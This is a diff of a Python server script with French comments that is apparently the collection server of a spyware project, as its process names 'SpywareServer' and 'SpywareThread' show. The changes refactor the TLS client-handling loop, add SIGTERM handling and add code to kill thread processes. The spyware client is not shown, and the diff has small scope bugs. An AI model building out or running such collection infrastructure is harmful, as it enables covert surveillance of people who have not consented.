@@ -10,6 +10,7 @@ import signal
 import psutil
 import setproctitle
 from threading import Thread
+from functools import partial
 
 # Arguments 
 
@@ -100,20 +101,49 @@ def read_file(filename):
 
 
 
-def get_server_instances():
-    procs = []
-
-    # itération sur tous les processus
-    for proc in psutil.process_iter():
-        if "SpywareServer" == proc.name():
-            procs.append(proc.pid)
-
-    return procs
+def change_return_code(return_code, signal=None, frame=None):
+    return_code[0] = "STOP"
 
 
 
-def stop_server(signal=None, frame=None):
+def handle_client(ssl_socket):
 
+
+    running = True
+    return_code = ["OK"]
+
+    partial_stop_thread = partial(change_return_code, return_code)
+
+    signal.signal(signal.SIGTERM, partial_stop_thread)
+
+
+
+    while return_code[0] == "OK":
+        try:
+    
+            # Réception des données
+            print("wait for data")
+            data = ssl_socket.recv(1024).decode('utf-8')
+
+            if data == "":
+                print("client dead ?")
+                return_code[0] = "STOP"
+
+            # si des données ont été réceptionnées
+            if data:
+                handle_data(data, addr)
+
+                # renvoyer un code
+                if return_code[0] == "OK":
+                    print("[+] Keep running")
+                    ssl_socket.send("OK".encode("utf-8"))
+
+
+        except Exception as e:
+            return_code[0] = "STOP"
+            print(f"Error Main : {e}")
+
+        
 
     data = ssl_socket.recv(1024).decode('utf-8')
 
@@ -128,6 +158,46 @@ def stop_server(signal=None, frame=None):
         time.sleep(1)
 
     ssl_socket.close()
+
+
+
+
+def get_server_instances():
+    procs = []
+
+    # itération sur tous les processus
+    for proc in psutil.process_iter():
+        if "SpywareServer" == proc.name():
+            procs.append(proc.pid)
+
+    return procs
+
+
+def get_thread_instances():
+    procs = []
+
+    # itération sur tous les processus
+    for proc in psutil.process_iter():
+        if "SpywareThread" == proc.name():
+            procs.append(proc.pid)
+
+    return procs
+
+
+
+def stop_server(signal=None, frame=None):
+
+
+    threads = get_thread_instances()
+
+    for th in threads:
+        try:
+            os.kill(th, signal.SIGTERM)
+
+        except Exception as e:
+            print(f"Error while killing threads : {e}")
+
+
     socket_server.close()
 
     print(f"stoping server. host : {host}")
@@ -156,72 +226,52 @@ if args.listen:
 
     print(f"Server listening on {host}:{port}")
 
-    running = True
-    return_code = "OK"
+    # while True:
+    try:
+        # récupération de la connexion
+        conn, addr = socket_server.accept()
 
-
-    # récupération de la connexion
-    conn, addr = socket_server.accept()
-
-    # création du contexte ssl (avec le certificat et la clé privée)
-    context_connexion_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-    context_connexion_ssl.load_cert_chain(certfile="./ssl2/certificate.pem", keyfile="./ssl2/private.pem")
-    
-    # utilisation du SSL pour lire les données entrantes
-    ssl_socket = context_connexion_ssl.wrap_socket(conn, server_side=True)
-
-
-    while running:
-        try:
-    
-            # Réception des données
-            print("wait for data")
-            data = ssl_socket.recv(1024).decode('utf-8')
-
-            if data == "":
-                print("client dead ?")
-                running = False
-
-            # si des données ont été réceptionnées
-            if data:
-                handle_data(data, addr)
-
-                # renvoyer un code
-                if return_code == "OK":
-                    print("[+] Keep running")
-                    ssl_socket.send("OK".encode("utf-8"))
-
-
-        # interception du KeyboardInterrupt
-        except KeyboardInterrupt as e:
-            answered = False
-            
-            while not answered:
-                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")
-
-                if respons == 'y' or respons == 'n':
-                    answered = True
-
-            if respons == 'n' or respons == 'N':
-                # ne rien faire
-                print("[+] Le serveur ne sera pas arrêté")
-
-
-            else:
-                # arrêter le serveur
-                print("[+] Le serveur va s'arrêter")
-
-                stop_server()
-
-
-        except Exception as e:
-            running = False
-            print(f"Error Main : {e}")
-
+        # création du contexte ssl (avec le certificat et la clé privée)
+        context_connexion_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        context_connexion_ssl.load_cert_chain(certfile="./ssl3/cert.pem", keyfile="./ssl3/private_key.pem")
         
+        # utilisation du SSL pour lire les données entrantes
+        ssl_socket = context_connexion_ssl.wrap_socket(conn, server_side=True)
 
-    ssl_socket.close()
-    socket_server.close()
+        handle_client(ssl_socket)
+
+        # th = Thread(target=handle_client, args=(ssl_socket,))
+        # th.name = "SpywareThread"
+        # th.start()
+    
+    
+
+    # interception du KeyboardInterrupt
+    except KeyboardInterrupt as e:
+        answered = False
+        
+        while not answered:
+            respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")
+
+            if respons == 'y' or respons == 'n':
+                answered = True
+
+        if respons == 'n' or respons == 'N':
+            # ne rien faire
+            print("[+] Le serveur ne sera pas arrêté")
+
+
+        else:
+            # arrêter le serveur
+            print("[+] Le serveur va s'arrêter")
+
+            stop_server()
+
+
+    except Exception as e:
+        running = False
+        print(f"Error Main : {e}")
+
 
 
 
@@ -239,7 +289,7 @@ elif args.readfile:
 
 elif args.kill:
     print("kill all the instances")
-
+    
     procs = get_server_instances()
 
     print(f"{len(procs)} instances found")
